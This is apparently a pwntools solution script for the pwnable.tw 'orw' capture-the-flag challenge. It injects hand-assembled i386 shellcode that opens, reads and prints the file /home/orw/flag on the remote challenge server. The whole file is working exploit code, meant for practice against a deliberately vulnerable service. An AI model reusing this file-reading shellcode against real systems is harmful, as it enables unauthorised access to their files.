from pwn import *

context(os="linux", arch="i386", log_level="debug")

io = remote("chall.pwnable.tw", 10001)
# io = process("./orw")

string_buf_addr = 0x0804a0a0

getflag = ""
getflag += "\xb8\x05\x00\x00\x00"       # movl $0x5, %eax
getflag += "\xbb\xa0\xa0\x04\x08"       # movl $0x0804a0a0, %ebx
getflag += "\xb9\x00\x00\x00\x00"       # movl $0x0, %ecx
getflag += "\xba\x00\x00\x00\x00"       # movl $0x0, %edx
getflag += "\xcd\x80"                   # int $0x80

getflag += "\x89\xc3"                   # movl %eax, %ebx
getflag += "\xb8\x03\x00\x00\x00"       # movl $0x3, %eax
getflag += "\xb9\xa0\xa0\x04\x08"       # movl $0x0804a0a0, %ecx
getflag += "\xba\x30\x00\x00\x00"       # movl $0x30, %edx
getflag += "\xcd\x80"                   # int $0x80

getflag += "\xb8\x04\x00\x00\x00"       # movl $0x4, %eax
getflag += "\xbb\x01\x00\x00\x00"       # movl $0x1, %ebx
getflag += "\xb9\xa0\xa0\x04\x08"       # movl $0x0804a0a0, %ecx
getflag += "\xba\x30\x00\x00\x00"       # movl $0x30, %edx
getflag += "\xcd\x80"                   # int $0x80

payload = getflag + (0x40 - len(getflag)) * '\x90' + "/home/orw/flag" + '\x00'

io.recvuntil("Give my your shellcode:")
io.sendline(payload)
io.interactive()